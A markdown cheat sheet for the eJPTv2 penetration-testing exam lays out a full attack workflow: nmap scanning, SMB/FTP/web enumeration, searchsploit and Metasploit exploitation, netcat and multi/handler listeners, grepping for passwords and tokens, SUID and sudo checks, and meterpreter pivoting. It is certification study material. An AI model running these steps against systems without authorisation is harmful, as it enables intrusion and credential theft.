\
# CHEATSHEET — eJPTv2 Unified (Exam Workflow)

## Index
0) Setup + evidence  
1) Host discovery  
2) Port scanning (TCP/UDP)  
3) Service enumeration (quick recipes)  
4) Web discovery (dirs/files/verbs)  
5) Vulnerability triage (NSE/searchsploit/MSF)  
6) Exploitation workflow (MSF + manual)  
7) Post-exploitation (Win/Linux) + flag/creds hunting  
8) PrivEsc quick checks  
9) Pivoting (meterpreter basics)  
10) Final per-target checklist  

---

## 0) Setup + Evidence

```bash
mkdir -p ~/ejpt/{nmap,loot,web,notes}
cd ~/ejpt
nano notes/notes.md
```

**Notes template (fast):**
- Target: `<IP/FQDN>`
- Open TCP:
- Open UDP:
- Creds found:
- Interesting paths:
- Exploit path chosen:
- Flag(s):

---

## 1) Host Discovery

```bash
# fping sweep (quiet and fast)
fping -a -g <NET>/<CIDR> 2>/dev/null

# nmap ping sweep + save
nmap -sn <NET>/<CIDR> -oN nmap/hosts.txt

# Extract UP hosts from grepable output
nmap -sn -oG - <NET>/<CIDR> | awk '/Up$/{print $2}'
```

---

## 2) Port Scanning

### TCP quick → full
```bash
nmap -Pn -sS -T4 --open <IP> -oN nmap/tcp_quick.txt
nmap -Pn -p- -sS -T4 --open <IP> -oA nmap/tcp_all
```

### Service detection on open ports
```bash
nmap -Pn -sC -sV -p <PORTS> <IP> -oA nmap/svc
```

### UDP (selective)
```bash
sudo nmap -sU --top-ports 25 --open <IP> -oN nmap/udp_top.txt
```

---

## 3) Service Enumeration — Quick Recipes

### SMB (139/445)
```bash
nmap -p 139,445 -sV -sC <IP> -oN nmap/smb_base.txt
nmap -p 445 --script smb-os-discovery,smb-protocols,smb-security-mode <IP> -oN nmap/smb_info.txt

enum4linux -a <IP>
smbclient -L //<IP> -N
smbclient //<IP>/<SHARE> -N
smbmap -u guest -p "" -d . -H <IP>
rpcclient -U "" -N <IP>
```

### FTP (21)
```bash
nmap -p 21 -sV -sC --script ftp-anon,ftp-syst <IP> -oN nmap/ftp.txt
ftp <IP>
# ls, cd, get <file>, put <file>
```

### SSH (22)
```bash
nmap -p 22 -sV -sC <IP> -oN nmap/ssh.txt
ssh <USER>@<IP>
```

### HTTP/HTTPS (80/443/8080)
```bash
whatweb http://<IP>
curl -I http://<IP>/
nc -v <IP> <PORT>
openssl s_client -connect <IP>:443
```

### SQL (MySQL 3306 / MSSQL 1433)
```bash
# MySQL
nmap -p 3306 -sV --script mysql-info,mysql-empty-password <IP> -oN nmap/mysql.txt
mysql -h <IP> -u <USER> -p
# show databases; use <db>; show tables;

# MSSQL
nmap -p 1433 -sV -sC --script ms-sql-info,ms-sql-ntlm-info <IP> -oN nmap/mssql.txt
```

### SMTP (25)
```bash
nmap -p 25 -sV -sC <IP> -oN nmap/smtp.txt
nc <IP> 25
# EHLO test
```

---

## 4) Web Discovery (Fast Path)

### Directories / files
```bash
dirb http://<IP>/
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 50
ffuf -w /path/to/wordlist.txt:FUZZ -u http://<IP>/FUZZ
```

### Methods (verbs)
```bash
curl -X OPTIONS -i http://<IP>/
```

### Quick “interesting file” checks
- `robots.txt`, `sitemap.xml`
- backups: `.bak`, `.old`, `.zip`, `~`
- app configs: `wp-config.php`, `settings.php`, `.env`

---

## 5) Vulnerability Triage

```bash
# NSE "vuln" (can be noisy)
nmap -sV --script vuln -p <PORTS> <IP> -oN nmap/vuln.txt

# ExploitDB
searchsploit <SERVICE> <VERSION>
searchsploit -m <ID>
```

---

## 6) Exploitation Workflow (Exam-Speed)

### Metasploit loop
```text
msfconsole -q
search <service/version/cve>
use <module>
info
show options
set RHOSTS <IP>
set payload <PAYLOAD>   # if required
run
```

### Handler (if using msfvenom)
```text
use multi/handler
set payload <PAYLOAD>
set LHOST <YOUR_IP>
set LPORT <PORT>
run
```

### Netcat listener
```bash
nc -nvlp <LPORT>
```

---

## 7) Post-Exploitation + Flag/Creds Hunting

### Windows (CMD quick)
```bat
whoami
hostname
systeminfo
ipconfig /all
net users
net localgroup administrators
dir /b/s "*.txt"
dir /b/s "*pass*"
type C:\path\file.txt
```

### Linux (quick)
```bash
whoami; id
uname -a; cat /etc/*release
ip a; ip route; ss -tulpn
ls -lah /home; cat /etc/passwd
find / -maxdepth 4 -type f -iname "*flag*" 2>/dev/null
grep -RniE "pass|password|apikey|token|secret|user" /etc /var/www 2>/dev/null | head
```

### TTY upgrade (Linux)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# CTRL+Z
stty raw -echo && fg
reset
export TERM=xterm
```

---

## 8) PrivEsc Quick Checks

### Linux
```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
crontab -l
cat /etc/crontab
```

### Windows (meterpreter)
- `getsystem`
- `getprivs`
- migrate to a stable process if needed

---

## 9) Pivoting (meterpreter basics)

```text
run autoroute -s <SUBNET>
run autoroute -p
background
sessions -l
```

Port forward:
```text
portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <REMOTE_IP>
```

---

## 10) Final Per-Target Checklist (TL;DR)

- [ ] `nmap -p-` saved (`-oA`)
- [ ] `nmap -sC -sV -p <ports>` saved
- [ ] Service enumeration completed (SMB/FTP/HTTP/SQL)
- [ ] Choose 1 main exploit path → get stable access
- [ ] Hunt: configs → creds → flags (save to `loot/`)
- [ ] Update `notes.md` with commands + outputs + found credentials
